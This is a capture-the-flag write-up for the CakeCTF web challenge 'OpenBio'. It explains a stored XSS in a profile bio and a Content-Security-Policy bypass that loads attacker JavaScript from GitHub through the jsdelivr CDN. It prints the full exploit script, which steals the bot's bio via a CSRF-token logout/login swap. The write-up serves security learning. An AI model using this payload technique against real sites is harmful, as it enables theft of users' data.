# OpenBio

<span id="-web"></span><span id="web" class="tag">web</span> <span
id="-xss"></span><span id="xss" class="tag">xss</span> <span
id="-csp"></span><span id="csp" class="tag">csp</span>

## Analysis

We get a Flask application and its source. After creating an acconut and
logging in, we can set a profile message. This message can contain HTML
and it gets reflected with no sanitization at `/profile/<username>`.

<img src="img/edit.png"
style="width:800px" alt="edit.png" />

<img src="img/profile.png"
style="width:800px" alt="profile.png" />

There's also a report button, which makes a bot visit our profile. The
flag is in the bot's profile.

We can't just insert a `<script>` tag because of the CSP.

    Content-Security-Policy:

    default-src 'none';

    script-src 'nonce-2P4mGaKeoifj7M5tSk4V2Q=='
    https://cdn.jsdelivr.net/
    https://www.google.com/recaptcha/
    https://www.gstatic.com/recaptcha/
    'unsafe-eval';

    style-src https://cdn.jsdelivr.net/;

    frame-src https://www.google.com/recaptcha/
    https://recaptcha.google.com/recaptcha/;

    base-uri 'none';

    connect-src 'self';

The nonce isn't guessable, so the only other option would be to figure
out if there's a way to host our JavaScript on any of the whitelisted
sources.

It turns out jsdelivr actually
[allows](https://github.com/jsdelivr/jsdelivr#github) GitHub
repositories to be accessed through it like this.

    /gh/user/repo@version/file

The `connect-src` also makes it so that we cannot make a request to
ourselves with the flag, so we need to get it some other way. Another
point is that the session cookie is `HttpOnly`, so we need to get the
actual flag, getting the cookie won't work.

## Solution

Here's the steps my solution takes:

1.  Get the flag from the bot's bio.
2.  Log the bot out.
3.  Log in as my user.
4.  Set my bio to the flag.

The script has to be hosted on GitHub and then accessed through
jsdelivr.

    <script src="https://cdn.jsdelivr.net/gh/gabrielott/bla@0a55d65/pwn.js"></script>

The idea is fairly simple, but it took me a while to get it to work. The
CSRF token was specially annoying.

    const BASE = "http://challenge:8080/";

    const wait = ms => new Promise(resolve => setTimeout(resolve, ms));

    (async () => {
        let ret = await fetch(BASE)
            .then(r => r.text())
            .then(html => {
                let parser = new DOMParser();
                let doc = parser.parseFromString(html, "text/html");
                return [
                    doc.getElementById("bio").innerHTML,
                    doc.getElementById("csrf_token").getAttribute("value")
                ];
            });

        const flag = ret[0];
        let csrfToken = ret[1];

        let params = new URLSearchParams();
        params.append("csrf_token", csrfToken)
        fetch(BASE + "api/user/logout", {
            method: "POST",
            body: params
        });

        await wait(500);

        csrfToken = await fetch(BASE)
            .then(r => r.text())
            .then(html => {
                let parser = new DOMParser();
                let doc = parser.parseFromString(html, "text/html");
                return doc.getElementById("csrf_token").getAttribute("value");
            });

        await wait(500);

        params = new URLSearchParams();
        params.append("csrf_token", csrfToken);
        params.append("username", "ottoboni");
        params.append("password", "ottoboni");
        fetch(BASE + "api/user/login", {
            method: "POST",
            body: params
        });

        await wait(500);

        params = new URLSearchParams();
        params.append("csrf_token", csrfToken);
        params.append("bio", flag);
        fetch(BASE + "api/user/update", {
            method: "POST",
            body: params,
            credentials: "include"
        });
    })();

The flag is: `CakeCTF{httponly=true_d03s_n0t_pr0t3ct_U_1n_m4ny_c4s3s!}`.

<img src="img/flag.png"
style="width:800px" alt="flag.png" />
